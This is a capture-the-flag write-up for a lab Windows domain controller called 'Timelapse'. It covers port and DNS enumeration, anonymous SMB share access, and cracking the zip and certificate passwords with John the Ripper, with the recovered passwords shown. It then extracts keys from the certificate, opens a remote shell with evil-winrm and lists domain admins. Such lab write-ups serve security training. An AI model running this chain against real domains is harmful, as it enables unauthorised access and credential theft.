# Timelapse

## Information Gathering

## Enumeration

Start with your nmap scan:
```s
$ sudo nmap -p- -A -T4 -oN nmap/all.nmap -Pn 10.10.11.152       
[sudo] password for cerb: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 20:20 EDT
Stats: 0:06:43 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 68.75% done; ETC: 20:27 (0:00:13 remaining)
Stats: 0:06:48 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 68.75% done; ETC: 20:27 (0:00:15 remaining)
Nmap scan report for 10.10.11.152
Host is up (0.092s latency).
Not shown: 65519 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-28 08:32:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2023-05-28T08:34:12+00:00; +8h05m46s from scanner time.
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
54971/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8h05m45s, deviation: 0s, median: 8h05m45s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-05-28T08:33:35
|_  start_date: N/A

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   13.08 ms  10.10.14.1
2   129.16 ms 10.10.11.152
```

### 53/tcp

From the nmap scan, we may have a domain name `timelapse.htb`. Lets look up all records for this domain:

```s
$ dig any @10.10.11.152 timelapse.htb 

; <<>> DiG 9.18.12-1-Debian <<>> any @10.10.11.152 timelapse.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 24377
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 7, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;timelapse.htb.                 IN      ANY

;; ANSWER SECTION:
timelapse.htb.          600     IN      A       10.10.11.152
timelapse.htb.          3600    IN      NS      dc01.timelapse.htb.
timelapse.htb.          3600    IN      SOA     dc01.timelapse.htb. hostmaster.timelapse.htb. 152 900 600 86400 3600
timelapse.htb.          600     IN      AAAA    dead:beef::9914:5e82:1222:7064
timelapse.htb.          600     IN      AAAA    dead:beef::1e6
timelapse.htb.          600     IN      AAAA    dead:beef::24e
timelapse.htb.          600     IN      AAAA    dead:beef::b5c6:f9aa:a6a6:3e26

;; ADDITIONAL SECTION:
dc01.timelapse.htb.     3600    IN      A       10.10.11.152
dc01.timelapse.htb.     3600    IN      AAAA    dead:beef::1e6
dc01.timelapse.htb.     3600    IN      AAAA    dead:beef::9914:5e82:1222:7064

;; Query time: 12 msec
;; SERVER: 10.10.11.152#53(10.10.11.152) (TCP)
;; WHEN: Sat May 27 20:22:23 EDT 2023
;; MSG SIZE  rcvd: 308
```

Looks like we have a NS `dc01.timelapse.htb` as well as two SOA's `dc01.timelapse.htb` and `hostmaster.timelapse.htb`.


### 139/tcp, 445/tcp

Enumerating for NULL shares:

```s
$ smbmap -u '' -p '' -H 10.10.11.152               
[+] IP: 10.10.11.152:445        Name: 10.10.11.152

$ smbclient -L \\\\10.10.11.152 -N  

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

The only share we have anonymous access to is `Shares`:

```s
$ smbmap -u 'anonymous' -p '' -H 10.10.11.152
[+] Guest session       IP: 10.10.11.152:445    Name: 10.10.11.152                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Shares                                                  READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share
```

Recursivly download this share:

```s
mask ""
recurse ON
prompt OFF
mget *
...
$ find . -type f
./HelpDesk/LAPS.x64.msi
./HelpDesk/LAPS_OperationsGuide.docx
./HelpDesk/LAPS_TechnicalSpecification.docx
./HelpDesk/LAPS_Datasheet.docx
./Dev/winrm_backup.zip
```

There's a few interesting things here. Before digging into the `docx`, lets look at `winrm_backup.zip`. Attempting to decompress:

```s
$ unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password:
```

I get prompted for a password. Let's attempt to crack this. We'll need to extract the hash and run `JtR`.

```s
$ zip2john winrm_backup.zip > winrm_backup_zip.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt winrm_backup_zip.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2023-05-27 20:36) 2.325g/s 8077Kp/s 8077Kc/s 8077KC/s swimfan12..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We can use the password `supremelegacy` to decompress `winrm_backup.zip`. After decompression, this spits out `legacy_dev_auth.pfx` which is a [Personal Information Exchange (.pfx)](https://learn.microsoft.com/en-us/windows-hardware/drivers/install/personal-information-exchange---pfx--files) certificate. After a bit of research, you can actually use the `pfx` file to authenticate and get a shell. We can accomplish this using `evil-winrm`. We'll first need to get the public and private key from the `pfx` file. First, crack the passphrase of the `pfx` file using `JtR`

```s
$ pfx2john legacyy_dev_auth.pfx > legacy_dev_auth_pfx.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt legacy_dev_auth_pfx.hash
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:00:08 DONE (2023-05-27 20:50) 0.1209g/s 390779p/s 390779c/s 390779C/s thyriana..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Nice, we get the passpharse `thuglegacy`. Now, generate the public and private key pair:

```s
$ openssl pkcs12 -in yourfile.pfx -nocerts -out priv.pem -nodes
$ openssl pkcs12 -in yourfile.pfx -clcerts -nokeys -out publickey.pem
```

Lastly, we can use `evil-winrm` with our new keys to gain foothold.

```s
$ evil-winrm -i 10.10.11.152 -c pub.pem -k priv.pem -S -r timelapse.htb
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
```

## Foothold

With the .pfx file, we can generate the corresponding public and private keys

```s
$ openssl pkcs12 -in yourfile.pfx -nocerts -out priv.pem -nodes
$ openssl pkcs12 -in yourfile.pfx -clcerts -nokeys -out publickey.pem
```

With the pub and priv keys, we can authenticate to the machine:

```s
$ evil-winrm -i 10.10.11.152 -c pub.pem -k priv.pem -S -r timelapse.htb
```

## Esclation of Privilege

## Domain

Lets get all the users in the domain

```powershell
PS C:\Users\legacyy\Desktop> net user /domain
-------------------------------------------------------------------------------
Administrator            babywyrm                 Guest
krbtgt                   legacyy                  payl0ad
sinfulz                  svc_deploy               thecybergeek
TRX
The command completed with one or more errors.
```

Checking for domain admins

```powershell
PS C:\Users\legacyy\Desktop> net group "Domain Admins" /domain
-------------------------------------------------------------------------------
Administrator            payl0ad                  thecybergeek
TRX
```